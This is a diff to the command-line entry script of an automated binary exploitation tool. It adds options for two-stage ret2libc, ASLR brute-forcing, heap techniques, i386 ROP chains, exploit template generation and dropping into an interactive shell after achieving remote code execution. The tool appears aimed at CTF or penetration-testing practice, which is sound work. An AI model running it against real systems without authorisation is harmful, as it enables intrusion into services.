@@ -6,6 +6,7 @@ Installed:      binsmasher binary -b ./vuln --host 127.0.0.1 --port 4444 -t
 """
 import sys
 import os
+import time
 
 # Make sure the directory containing this file is on sys.path so that
 # the sibling packages (utils, analyzer, exploiter, fuzzer, file_exploiter)
@@ -23,6 +24,12 @@ from rich.panel import Panel
 from utils import ExploitConfig, setup_logging, RichHelpFormatter, console
 from utils._process import set_core_pattern, default_log_path, no_core_preexec
 from analyzer import BinaryAnalyzer
+from analyzer.vuln_detect import VulnDetector
+from analyzer.libc_db import resolve_from_leak, detect_libc_version
+from utils.adaptive_timeout import get_adaptive_timeout, patch_connect_with_adaptive_timeout
+from utils.json_output import build_result, write_json, print_json, write_summary_markdown
+from analyzer.cache import clear_cache as _clear_cache
+from analyzer.angr_analysis import angr_find_win
 from exploiter import ExploitGenerator, _run_udp_spawn_exploit
 from fuzzer import Fuzzer
 from file_exploiter import FileExploiter
@@ -119,6 +126,39 @@ def _build_parser() -> argparse.ArgumentParser:
     dos.add_argument("--dos",             action="store_true")
     dos.add_argument("--generate-scripts",action="store_true")
 
+    new = bp.add_argument_group("new features")
+    new.add_argument("--interactive", action="store_true",
+                     help="Drop to interactive shell after successful exploit")
+    new.add_argument("--multistage", action="store_true",
+                     help="Force two-stage TCP exploit (leak libc then ret2system)")
+    new.add_argument("--template", action="store_true",
+                     help="Generate a complete ready-to-use solve.py template")
+    new.add_argument("--angr", action="store_true",
+                     help="Use angr symbolic execution to find win path / offset")
+    new.add_argument("--clear-cache", action="store_true", dest="clear_cache",
+                     help="Clear analysis cache for this binary before running")
+    new.add_argument("--no-cache", action="store_true", dest="no_cache",
+                     help="Disable analysis cache for this run")
+
+    adv2 = bp.add_argument_group("new exploit techniques")
+    adv2.add_argument("--detect-vuln", action="store_true", dest="detect_vuln",
+                      help="Auto-detect vulnerability type before exploiting")
+    adv2.add_argument("--brute-aslr", action="store_true", dest="brute_aslr",
+                      help="Brute-force ASLR without a leak (PIE/libc base guessing)")
+    adv2.add_argument("--brute-attempts", type=int, default=256, dest="brute_attempts",
+                      help="Max ASLR brute attempts (default: 256)")
+    adv2.add_argument("--heap-advanced", action="store_true", dest="heap_advanced",
+                      help="Use advanced heap techniques (tcache, house-of-apple2, dynelf)")
+    adv2.add_argument("--adaptive-timeout", action="store_true", dest="adaptive_timeout",
+                      help="Auto-scale timeouts based on measured RTT to target")
+    adv2.add_argument("--output-json", default=None, dest="output_json",
+                      metavar="PATH", help="Write structured JSON result to file")
+    adv2.add_argument("--output-markdown", action="store_true", dest="output_markdown",
+                      help="Write Markdown report to _bs_work/")
+    adv2.add_argument("--print-json", action="store_true", dest="print_json",
+                      help="Print result as JSON to stdout")
+
+
     # ── solana ────────────────────────────────────────────────────────────────
     sp = sub.add_parser("solana", help="Agave/Solana auditing",
                         formatter_class=RichHelpFormatter)
@@ -149,6 +189,55 @@ def _build_parser() -> argparse.ArgumentParser:
 
 def run_binary(cfg):
     log = logging.getLogger("binsmasher")
+
+    # ── Cache and angr ─────────────────────────────────────────────────
+    if getattr(cfg, "clear_cache", False):
+        _clear_cache(cfg.binary)
+        log.info(f"[cache] cleared for {cfg.binary}")
+
+    if getattr(cfg, "no_cache", False):
+        from analyzer import cache as _cache_mod
+        _cache_mod.load_cache = lambda *a, **k: None  # disable reads
+
+    # ── angr path exploration (before classic analysis) ────────────────
+    if getattr(cfg, "use_angr", False):
+        log.info("[angr] Running symbolic exploration…")
+        angr_result = angr_find_win(cfg.binary, timeout=90)
+        if angr_result["found"]:
+            log.info(f"[angr] Win path found: {angr_result['notes']}")
+            if angr_result.get("offset_hint"):
+                log.info(f"[angr] Offset hint: {angr_result['offset_hint']}")
+            if angr_result.get("win_addr"):
+                log.info(f"[angr] Win addr: {hex(angr_result['win_addr'])}")
+        else:
+            log.info(f"[angr] {angr_result['notes']}")
+
+    # ── Adaptive timeout ──────────────────────────────────────────────────
+    _at = None
+    if getattr(cfg, "adaptive_timeout", False):
+        log.info("[adaptive] Measuring RTT to target…")
+        _at = get_adaptive_timeout(cfg.host, cfg.port)
+        _at.measure()
+        log.info(f"[adaptive] {_at}")
+
+    # ── Vuln auto-detection ───────────────────────────────────────────────
+    _vuln_info = None
+    if getattr(cfg, "detect_vuln", False):
+        log.info("[vuln_detect] Auto-detecting vulnerability type…")
+        detector = VulnDetector(cfg.host, cfg.port, udp=cfg.udp,
+                                connect_timeout=_at.connect if _at else 3.0,
+                                recv_timeout=_at.send_recv if _at else 2.0)
+        _vuln_info = detector.detect()
+        log.info(f"[vuln_detect] Result: {_vuln_info}")
+        from rich.panel import Panel as _Panel
+        from utils._console import console as _con
+        _con.print(_Panel(
+            f"[bold]Vuln type:[/] {_vuln_info.vuln_type}  "
+            f"[bold]Confidence:[/] {_vuln_info.confidence:.0%}\n"
+            f"[bold]Crash size:[/] {_vuln_info.crash_size}  "
+            f"[bold]FmtStr offset:[/] {_vuln_info.format_string_offset}\n"
+            + "\n".join(_vuln_info.notes),
+            title="[bold cyan]Vuln Detection[/]", border_style="cyan"))
 
     analyzer  = BinaryAnalyzer(cfg.binary, cfg.log_file)
     platform, arch = analyzer.setup_context()
@@ -219,6 +308,24 @@ def run_binary(cfg):
                       canary_enabled=canary_enabled, aslr=aslr)
         return
 
+    # ── Multi-stage exploit ────────────────────────────────────────────
+    if getattr(cfg, "multistage", False) and not udp_spawn_mode and offset is not None:
+        log.info("[multistage] Attempting two-stage ret2libc…")
+        ms_ok, ms_type = exploiter.two_stage_exploit(
+            offset=offset, canary=None, pie_base=None,
+            functions=functions, relro=relro, nx=nx, aslr=aslr)
+        if ms_ok:
+            log.info(f"[multistage] ✓ RCE confirmed via {ms_type}")
+            if getattr(cfg, "template", False) or cfg.generate_scripts:
+                exploiter.generate_template(offset, None, None, {},
+                    ms_type, cfg.binary, functions)
+            print_summary(offset, stack_addr, None, ms_type, "Success",
+                          None, target_function, ["Multi-stage exploit succeeded"],
+                          nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
+            return
+        else:
+            log.warning("[multistage] Two-stage failed — continuing with standard path")
+
     is_fork = False
     if not udp_spawn_mode:
         is_fork = exploiter._detect_fork_server()
@@ -257,6 +364,35 @@ def run_binary(cfg):
                       canary, target_function, suggestions,
                       nx=nx, pie=pie, relro=relro, canary_enabled=canary_enabled, aslr=aslr)
         return
+
+    # ── Brute-force ASLR ─────────────────────────────────────────────────
+    if getattr(cfg, "brute_aslr", False) and offset is not None and not udp_spawn_mode:
+        log.info("[brute_aslr] Starting ASLR brute force…")
+        from analyzer.libc_db import get_one_gadgets, LIBC_DB
+        ba_ok, ba_type = exploiter.brute_aslr_auto(
+            offset=offset, canary=canary, pie=pie, nx=nx,
+            max_attempts=getattr(cfg, "brute_attempts", 256))
+        if ba_ok:
+            log.info(f"[brute_aslr] ✓ RCE via {ba_type}")
+            print_summary(offset, stack_addr, None, ba_type, "Success",
+                          canary, target_function, ["ASLR brute succeeded"],
+                          nx=nx, pie=pie, relro=relro,
+                          canary_enabled=canary_enabled, aslr=aslr)
+            return
+        log.warning("[brute_aslr] Brute failed — continuing standard path")
+
+    # ── i386 specific path ────────────────────────────────────────────────
+    if offset is not None and arch in ("i386", "x86") and not udp_spawn_mode:
+        i386_chain = exploiter.build_rop_chain_i386(offset, canary, base_addr, offsets)
+        if i386_chain and cfg.test_exploit:
+            ok_i, out_i = exploiter._check_rce(i386_chain)
+            if ok_i:
+                log.info("[i386] ✓ RCE via i386 ROP chain")
+                print_summary(offset, stack_addr, None, "ret2libc_i386", "Success",
+                              canary, target_function, ["i386 exploit succeeded"],
+                              nx=nx, pie=pie, relro=relro,
+                              canary_enabled=canary_enabled, aslr=aslr)
+                return
 
     fmt_payload = None
     if findings["format_string_functions"] and not udp_spawn_mode:
@@ -339,6 +475,13 @@ def run_binary(cfg):
     if success and cfg.privilege_escalation:
         exploiter.attempt_privilege_escalation()
 
+    # ── Template generator ─────────────────────────────────────────────
+    if getattr(cfg, "template", False):
+        tpl = exploiter.generate_template(
+            offset, canary, base_addr, offsets,
+            exploit_type or "unknown", cfg.binary, functions)
+        log.info(f"[template] → {tpl}")
+
     if cfg.generate_scripts:
         crash_script   = exploiter.generate_crash_script(offset, cfg.binary)
         exploit_script = exploiter.generate_exploit_script(
@@ -387,6 +530,41 @@ def run_binary(cfg):
                     break
         except Exception:
             pass
+
+
+    # ── JSON / Markdown output ────────────────────────────────────────────
+    _result_data = None
+    if (getattr(cfg, 'output_json', None) or
+            getattr(cfg, 'output_markdown', False) or
+            getattr(cfg, 'print_json', False)):
+        _start_t = getattr(cfg, '_start_time', None)
+        _dur = (time.time() - _start_t) if _start_t else None
+        _result_data = build_result(
+            binary=cfg.binary, host=cfg.host, port=cfg.port,
+            offset=offset, exploit_type=exploit_type,
+            status='Success' if success else 'Failed',
+            canary=canary, return_addr=display_ra,
+            target_function=used_function or target_function,
+            nx=nx, pie=pie, aslr=aslr, relro=relro,
+            canary_enabled=canary_enabled,
+            findings=findings, libc_base=base_addr, offsets=offsets,
+            suggestions=suggestions,
+            vuln_type=getattr(_vuln_info, 'vuln_type', None) if '_vuln_info' in dir() else None,
+            duration_sec=_dur,
+        )
+        if getattr(cfg, 'output_json', None):
+            write_json(_result_data, cfg.output_json)
+        if getattr(cfg, 'output_markdown', False):
+            write_summary_markdown(_result_data)
+        if getattr(cfg, 'print_json', False):
+            print_json(_result_data)
+
+    # ── Interactive shell ──────────────────────────────────────────────
+    if getattr(cfg, "interactive", False) and success:
+        exploiter.interactive_shell(
+            offset=offset, canary=canary, libc_base=base_addr,
+            offsets=offsets, exploit_type=exploit_type or "ret2win",
+            return_addr=display_ra)
 
     print_summary(offset, stack_addr, display_ra, exploit_type,
                   "Success" if success else "Failed",
@@ -476,6 +654,21 @@ def main():
             payload_data=args.payload_data, udp=args.udp,
             spawn_target=args.spawn_target)
         cfg.bad_bytes_str = args.bad_bytes_str
+        cfg.interactive   = getattr(args, "interactive", False)
+        cfg.multistage    = getattr(args, "multistage", False)
+        cfg.template      = getattr(args, "template", False)
+        cfg.use_angr      = getattr(args, "angr", False)
+        cfg.clear_cache   = getattr(args, "clear_cache", False)
+        cfg.no_cache      = getattr(args, "no_cache", False)
+        cfg.detect_vuln   = getattr(args, "detect_vuln", False)
+        cfg.brute_aslr    = getattr(args, "brute_aslr", False)
+        cfg.brute_attempts = getattr(args, "brute_attempts", 256)
+        cfg.heap_advanced  = getattr(args, "heap_advanced", False)
+        cfg.adaptive_timeout = getattr(args, "adaptive_timeout", False)
+        cfg.output_json   = getattr(args, "output_json", None)
+        cfg.output_markdown = getattr(args, "output_markdown", False)
+        cfg.print_json    = getattr(args, "print_json", False)
+        cfg._start_time   = time.time()
         log = setup_logging(cfg.log_file)
         cfg.validate()
         run_binary(cfg)
